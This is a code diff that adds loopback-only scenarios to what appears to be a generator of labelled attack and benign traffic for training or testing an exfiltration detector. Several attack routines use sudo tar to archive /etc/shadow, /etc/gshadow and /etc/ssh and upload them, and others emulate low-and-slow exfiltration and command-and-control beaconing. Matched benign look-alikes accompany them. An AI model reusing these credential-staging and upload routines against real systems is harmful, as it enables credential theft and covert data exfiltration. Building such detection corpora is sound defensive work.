@@ -418,6 +418,219 @@ def idle_workload(wd, rng, act):
     time.sleep(25)
 
 
+# --------------------------------------------------------------------------
+# Real-byte scenarios (added 2026-11-05, plan Workstream D). The original attacks above only
+# connect_ex() to loopback addresses with no listener, so they transmit nothing and a byte
+# counter cannot tell them from silence. These move REAL bytes to a loopback sink inside the
+# payload's own process tree, in matched attack / benign pairs. Still loopback only, no exploit
+# code, files under --workdir. Existing scenarios are untouched so earlier corpora stay comparable.
+# --------------------------------------------------------------------------
+
+BULK_MIB = (16, 48)        # size range of the generated bulk blob (tests shrink it)
+SLOW_SENDS = 8             # sends in the slow exfil (tests shrink it)
+BEACONS = 20               # check-ins in the beacon scenarios (tests shrink it)
+SHARED_PORTS = (8443, 9001, 9100)   # attack and benign draw from the SAME ports so a port cannot leak the label
+
+
+def _write_blob(path, mib, rng):
+    """Filler that stands in for a database dump or data set, 1 MiB at a time. Archived with plain `tar cf`
+    (no compression), so the bytes on the wire equal the size on disk."""
+    with open(path, "wb") as f:
+        for _ in range(mib):
+            f.write(bytes(rng.getrandbits(8) for _ in range(256)) * 4096)   # 1 MiB, cheap to generate
+    return os.path.getsize(path)
+
+
+class _ReplySink(threading.Thread):
+    """Loopback 'server' for beacons: reads one message per connection and answers with a short reply."""
+
+    def __init__(self, host, port=0):
+        super().__init__(daemon=True)
+        assert_loopback(host)
+        self.srv = socket.socket()
+        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.srv.bind((host, port))
+        self.srv.listen(8)
+        self.srv.settimeout(0.5)
+        self.port = self.srv.getsockname()[1]
+        self.received = 0
+        self._stop_flag = threading.Event()
+
+    def run(self):
+        while not self._stop_flag.is_set():
+            try:
+                c, _ = self.srv.accept()
+            except (socket.timeout, OSError):
+                continue
+            with c:
+                c.settimeout(2.0)
+                try:
+                    while True:
+                        data = c.recv(65536)
+                        if not data:
+                            break
+                        self.received += len(data)
+                        c.sendall(b"ok" * 32)
+                except OSError:
+                    pass
+
+    def close(self):
+        self._stop_flag.set()
+        self.join(timeout=2)
+        self.srv.close()
+
+
+def _beacon(host, port, payload):
+    """One check-in: connect, send, read the reply, close. Returns bytes sent."""
+    with socket.create_connection((host, port), timeout=3) as c:
+        c.sendall(payload)
+        c.settimeout(2.0)
+        try:
+            c.recv(4096)
+        except OSError:
+            pass
+    return len(payload)
+
+
+def exfil_small_real(wd, rng, act):
+    """Credential-theft-sized exfiltration: stage ONLY the secrets (a few KB), then really upload
+    them. MATCHED with benign_telemetry_small (same size class, no secrets) and with
+    exfil_staging, which stages the same files but sends nothing."""
+    sink = _Sink("127.0.0.2")
+    sink.start()
+    try:
+        for rnd in range(rng.randint(2, 4)):
+            stage = os.path.join(wd, f".u{rnd}.tgz")
+            act("stage_secrets_with_tar", malicious=True, round=rnd)
+            run(["sudo", "-n", "tar", "czf", stage, "/etc/shadow", "/etc/gshadow", "/etc/ssh"])
+            if os.path.exists(stage):
+                sent = _upload("127.0.0.2", sink.port, stage)
+                act("send_out", malicious=True, round=rnd, bytes=sent)
+            time.sleep(rng.uniform(0.5, 1.5))
+    finally:
+        sink.close()
+
+
+def exfil_bulk_real(wd, rng, act):
+    """Bulk exfiltration: /etc (secrets included) plus a large data blob, really uploaded.
+    By volume this looks like a backup; MATCHED with benign_backup_bulk. Only context (what is
+    archived and why) differs, which is the point of the pair."""
+    sink = _Sink("127.0.0.2")
+    sink.start()
+    try:
+        blob = os.path.join(wd, ".data.bin")
+        mib = rng.randint(*BULK_MIB)
+        act("stage_data", malicious=True, mib=mib)
+        _write_blob(blob, mib, rng)
+        archive = os.path.join(wd, ".pack.tgz")
+        act("stage_secrets_with_tar", malicious=True)
+        run(["sudo", "-n", "tar", "cf", archive, "/etc/shadow", "/etc/gshadow", "/etc/ssh", blob], timeout=90)
+        if os.path.exists(archive):
+            sent = _upload("127.0.0.2", sink.port, archive)
+            act("send_out", malicious=True, bytes=sent)
+    finally:
+        sink.close()
+
+
+def exfil_slow_real(wd, rng, act):
+    """Low-and-slow exfiltration: a few KB every few seconds. The per-send volume is small and
+    the timing regular; MATCHED with benign_telemetry_small on volume."""
+    sink = _Sink("127.0.0.2")
+    sink.start()
+    try:
+        stage = os.path.join(wd, ".s.tgz")
+        act("stage_secrets_with_tar", malicious=True)
+        run(["sudo", "-n", "tar", "czf", stage, "/etc/shadow", "/etc/gshadow", "/etc/ssh"])
+        data = open(stage, "rb").read() if os.path.exists(stage) else b"x" * 2048
+        for k in range(SLOW_SENDS):
+            chunk = data[k * 512:(k + 1) * 512] or b"x" * 512
+            with socket.create_connection(("127.0.0.2", sink.port), timeout=3) as c:
+                c.sendall(chunk)
+            act("send_out", malicious=True, n=k, bytes=len(chunk))
+            time.sleep(rng.uniform(4.0, 6.0))
+    finally:
+        sink.close()
+
+
+def c2_beacon_real(wd, rng, act):
+    """Command-and-control beaconing with real check-ins: a fixed interval, a small payload and a
+    reply, with an occasional larger 'result' upload. MATCHED with benign_heartbeat_real, which has
+    the same interval, size and ports; only the process and file-access context differs."""
+    port = rng.choice(SHARED_PORTS)
+    srv = _ReplySink("127.0.0.4", port)
+    srv.start()
+    try:
+        interval = rng.uniform(0.8, 1.2)
+        for i in range(BEACONS):
+            act("beacon", malicious=True, n=i)
+            sent = _beacon("127.0.0.4", srv.port, os.urandom(rng.randint(120, 260)))
+            if i % 7 == 6:
+                act("result_upload", malicious=True, n=i)
+                sent += _beacon("127.0.0.4", srv.port, os.urandom(20000))
+            time.sleep(interval)
+    finally:
+        srv.close()
+
+
+def backup_bulk_workload(wd, rng, act):
+    """HARD NEGATIVE matched to exfil_bulk_real: /etc plus a large data set archived and uploaded
+    to a backup host, the same size class as the bulk exfiltration."""
+    sink = _Sink("127.0.0.3")
+    sink.start()
+    try:
+        blob = os.path.join(wd, "dataset.bin")
+        mib = rng.randint(*BULK_MIB)
+        act("prepare_dataset", mib=mib)
+        _write_blob(blob, mib, rng)
+        archive = os.path.join(wd, "full-backup.tar")
+        act("backup_etc_and_data")
+        run(["sudo", "-n", "tar", "cf", archive, "/etc", blob], timeout=90)
+        if os.path.exists(archive):
+            sent = _upload("127.0.0.3", sink.port, archive)
+            act("upload_to_backup_host", bytes=sent)
+    finally:
+        sink.close()
+
+
+def heartbeat_real_workload(wd, rng, act):
+    """HARD NEGATIVE matched to c2_beacon_real: an agent's monitoring heartbeat with the same
+    interval, payload size and ports, plus an occasional metrics upload."""
+    port = rng.choice(SHARED_PORTS)
+    srv = _ReplySink("127.0.0.5", port)
+    srv.start()
+    try:
+        interval = rng.uniform(0.8, 1.2)
+        for i in range(BEACONS):
+            act("heartbeat", n=i)
+            sent = _beacon("127.0.0.5", srv.port, os.urandom(rng.randint(120, 260)))
+            if i % 7 == 6:
+                act("metrics_upload", n=i)
+                sent += _beacon("127.0.0.5", srv.port, os.urandom(20000))
+            time.sleep(interval)
+    finally:
+        srv.close()
+
+
+def telemetry_small_workload(wd, rng, act):
+    """HARD NEGATIVE matched to exfil_small_real and exfil_slow_real: a few KB of non-secret
+    system information (hostname, uname, disk usage) uploaded to a monitoring endpoint."""
+    sink = _Sink("127.0.0.3")
+    sink.start()
+    try:
+        for rnd in range(rng.randint(2, 4)):
+            report = os.path.join(wd, f"inventory-{rnd}.txt")
+            act("collect_inventory", round=rnd)
+            with open(report, "w") as f:
+                run(["uname", "-a"], stdout=f)
+                run(["df", "-h"], stdout=f)
+                run(["sh", "-c", "cat /etc/os-release; cat /etc/passwd | cut -d: -f1,3,7"], stdout=f)
+            sent = _upload("127.0.0.3", sink.port, report)
+            act("upload_inventory", round=rnd, bytes=sent)
+            time.sleep(rng.uniform(0.5, 1.5))
+    finally:
+        sink.close()
+
+
 SCENARIOS = {
     # name: (kind, family, function, approx_seconds)
     "credential_access":      ("attack", "credential_access",    credential_access,       8),
@@ -438,6 +651,25 @@ SCENARIOS = {
     "benign_credential_audit":("benign", "credential_audit",     credential_audit_workload, 8),
     "benign_backup_remote":   ("benign", "backup_remote",        backup_remote_workload,  14),
     "benign_credential_report":("benign", "credential_report",   credential_report_workload, 8),
+    # real-byte scenarios (see the section above)
+    "exfil_small_real":       ("attack", "exfil_small",          exfil_small_real,        12),
+    "exfil_bulk_real":        ("attack", "exfil_bulk",           exfil_bulk_real,         25),
+    "exfil_slow_real":        ("attack", "exfil_slow",           exfil_slow_real,         50),
+    "c2_beacon_real":         ("attack", "c2_real",              c2_beacon_real,          28),
+    "benign_backup_bulk":     ("benign", "backup_bulk",          backup_bulk_workload,    25),
+    "benign_heartbeat_real":  ("benign", "heartbeat",            heartbeat_real_workload, 28),
+    "benign_telemetry_small": ("benign", "telemetry_small",      telemetry_small_workload, 12),
+}
+
+
+# Scenario groups for runner.py --scenarios. "legacy" is exactly the 18 scenarios of the corpora captured
+# before the real-byte scenarios existed (use it to stay comparable with them); "real_bytes" is the new set.
+REAL_BYTE_NAMES = ("exfil_small_real", "exfil_bulk_real", "exfil_slow_real", "c2_beacon_real",
+                   "benign_backup_bulk", "benign_heartbeat_real", "benign_telemetry_small")
+GROUPS = {
+    "all": tuple(sorted(SCENARIOS)),
+    "legacy": tuple(sorted(n for n in SCENARIOS if n not in REAL_BYTE_NAMES)),
+    "real_bytes": tuple(sorted(REAL_BYTE_NAMES)),
 }
 
 
